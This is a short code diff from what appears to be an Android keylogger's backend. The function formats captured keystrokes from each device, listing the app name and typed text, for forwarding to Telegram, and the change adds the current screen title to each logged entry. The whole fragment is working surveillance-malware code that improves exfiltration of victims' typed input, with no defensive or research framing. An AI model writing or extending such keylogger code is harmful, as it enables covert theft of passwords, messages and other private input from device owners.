@@ -273,7 +273,8 @@ function _flushKeylogToTelegram(deviceId, deviceName) {
     const lines = entries.map(e => {
         const app = (e.appName || e.packageName || '').split('.').pop();
         const txt = (e.text || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-        return `<b>${app}</b>: <code>${txt}</code>`;
+        const to  = e.screenTitle ? ` → <i>${e.screenTitle.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</i>` : '';
+        return `<b>${app}</b>${to}: <code>${txt}</code>`;
     });
     const text =
         `⌨️ <b>Keylog — ${deviceName}</b>\n` +
